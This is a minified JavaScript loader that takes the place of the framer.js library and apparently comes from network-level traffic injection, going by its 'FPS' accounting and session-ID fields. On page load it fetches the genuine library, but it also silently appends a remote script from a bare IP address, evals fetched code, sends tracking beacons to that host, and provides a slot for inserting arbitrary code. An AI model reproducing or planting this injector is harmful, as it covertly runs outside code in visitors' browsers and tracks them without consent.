(function(){function sendAccounting(e,t){e=e||1;t=t||0;var n=new Image;11==t||j&&6==t||(n.src="http://107.14.53.4:80/"+e+"-5/2d61613b-17a0-4a9f-9e74-33111be73c3f_10.1.93.201/"+t+"."+(m+I));return n}function e(e){return j?"http://107.14.53.4/Check/2/5/2d61613b-17a0-4a9f-9e74-33111be73c3f/10.1.93.201/oquprv":1==e&&"http://107.14.53.4/CheckUrl/1/5"}function t(t){var i,r=Math.floor(1e3*I),o="fp",s=o+r,c="78b9305568daa3f33d4e6ce2645abfeea255fae4",a="_!$[]fp2d61613b-17a0-4a9f-9e74-33111be73c3f[]$!_";if(j&&g-j>54e5)return 11;"string"==typeof t.jsURI&&(t.jsURI=[t.jsURI]);if(y[a]===c)return 1;y[a]=c;if(t.requireTopWindow&&y!=top)return 2;if(t.requireObjectHasOwnProperty&&!Object.prototype.hasOwnProperty)return 3;if(t.json){if("string"==typeof t.json)try{t.json=y.eval("("+t.json+")")}catch(u){return 4}t.json.minimum_width=t.minWidth=t.json.minimum_width||t.minWidth;t.json.minimum_height=t.minHeight=t.json.minimum_height||t.minHeight;t.json._accounting={stopTime:h,sendAccounting:sendAccounting,uri:"http://107.14.53.76/static",check:e("%TOPURLMATCH%"),direct:!1}}if(!(t.json&&""===t.json.sprite_img||n(t.minHeight,t.minWidth)))return 5;if(t.json2uri){for(;void 0!==y[s];)s=o+ ++r;y[s]=t.json;for(i=0;t.jsURI.length>i;i++)t.jsURI[i]+=(-1!==t.jsURI[i].indexOf("?")?"&":"?")+s}}function n(e,t){var n=R.documentElement||R.body||{},i=y.innerWidth||n.clientWidth||0,r=y.innerHeight||n.clientHeight||0;return i>=e&&r>=t||!(i+r)}function i(){var e,n,i=(new Date).getTime(),r={//
// Carefully adjust the following values as needed
// Remove a line completely if it is not needed
requireTopWindow: false,
minWidth: 0,
minHeight: 0,
jsURI: 'http://107.14.53.4/static/Device/learn.js?FPSESSIONID=2d61613b-17a0-4a9f-9e74-33111be73c3f&COMMIP=107.14.53.4&GROUPS=1',
sendEarlyAccounting: true,

onInsert: function(){
// Insert any code below that you would like to run after the script
// specified in jsURI has been inserted.  Note that if any of the
// conditions stated above (i.e. minWidth) are not met the jsURI
// script will not be inserted and this code will also not be run.
//
// If "sendEarlyAccounting" is removed or set to false, you must call
// the "sendAccounting" function in order for this message to be properly
// counted in FPS.
// Example:  sendAccounting();

// ** DO NOT USE document.write **
// Begin code area


// End code area
},

/**/
1:2};if((e=t(r))||i>h)sendAccounting(2,e);else{r.sendEarlyAccounting&&sendAccounting(1);if(r.jsURI)for(e=0;r.jsURI.length>e;e++){n=o("script",null,"src",s(r.jsURI[e]),"type",l);n[I]=r.json;p.appendChild(n)}if(r.onInsert)try{r.onInsert()}catch(c){}}}function r(e){var t,n,i=[function(){return new XMLHttpRequest},function(){return new ActiveXObject("Msxml2.XMLHTTP")},function(){return new ActiveXObject("Microsoft.XMLHTTP")},y.createRequest];for(n=0;i.length>n;n++){t=0;try{t=i[n]();break}catch(r){t=0}}if(t)try{t.open("GET",e,!1);t.setRequestHeader("X-PLCS","xhr");t.send(null);if(200==t.status)return t.responseText||" "}catch(r){}}function o(e,t){var n,i=R.createElement(e);t&&i.appendChild(R.createTextNode(t));for(n=2;arguments.length>n;n+=2)i.setAttribute(arguments[n],arguments[n+1]);return i}function s(e){return e.replace("$PAGEURL$",escape(M.href))}function c(){y.V=c.V;c.oncomplete&&c.oncomplete()}try{var a,u,f,h,p,m,d,l="text/javascript",I=Math.random(),g=(new Date).getTime(),j=parseInt("oquprv",36),T=parseFloat("15"),y=window,R=document,M=y.location||R.location||{};f="http://"+unescape("builds.framerjs.com%2Fversion%2Flatest%2Fframer.js");p=R.createElement("div");m=3;p.innerHTML="<!--[if IE]><i></i><![endif]-->";d=p.getElementsByTagName("i").length;c.V=y.V;y.V=c;isNaN(T)&&(T=15);h=g+1e3*T-2;j=isFinite(j)?1e3*j:0;f+=(~f.indexOf("?")?~f.indexOf(";")?";":"&":"?")+"_fp"+(0|1e3*I)+"="+I;p=R.getElementsByTagName("script");p=((a=p.length)?p[a-1]:m=4).parentNode||R.body||R.documentElement.firstChild;if(f.split("/")[2]==M.host){u=r(f);if(u){m=1;c.js=u;c.oncomplete=i;return}}if(R.readyState==(d?"interactive":"loading")){m=2;R.write("<scr".concat('ipt src="')+f+'" type="'+l+'"></scr'.concat("ipt>"))}else p.appendChild(o("script",0,"src",f,"type",l,"async",!1));i()}catch(E){}})();if(window.V){if(V.js)try{window.eval(V.js)}catch(e){}V()}
/*
//@ sourceMappingURL=http://192.168.10.15/_source_maps/53aad279/lHaik0rMrRMz2I5rDNJ3HA.map
*/